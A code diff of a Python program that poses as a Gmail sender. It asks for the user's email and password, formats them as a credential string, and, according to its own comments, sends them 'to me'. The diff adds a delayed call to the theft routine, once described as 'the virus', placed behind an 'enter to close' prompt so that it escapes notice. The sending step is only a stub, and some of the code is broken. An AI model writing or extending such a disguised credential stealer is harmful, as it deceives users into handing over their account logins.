@@ -6,6 +6,7 @@ import os
 clear = lambda: os.system("cls")
 email = None
 password = None
+message = None
 
 def frontend():
     #Works with the other functions, to create the program.
@@ -29,7 +30,7 @@ def frontend():
     mode = input('Enter the number to the left of the mode you would like to use: ')
 
 def backend():
-    #To execute the virus.
+    #To email the details to me.
     pass
 
 def login():
@@ -72,6 +73,9 @@ def google_mail():
     detail_grab()
     send_mail()
     print('Email sent!')
+    input('Press enter to close this program')
+    #Even if you were to somehow check, when the email is sent, nothing bad has actually happened until you continue.
+    backend()
 
 def send_mail():
     #sends the real email.
@@ -79,9 +83,10 @@ def send_mail():
     body = input('Type the whole email here: ')
 
 def detail_grab():
-    #Emails the details of the account to me.
+    #Formats the details to send as an email.
     global email
     global password
+    global message
 
     message = (str('Email:Passowrd.     ', email, ':', password))
 
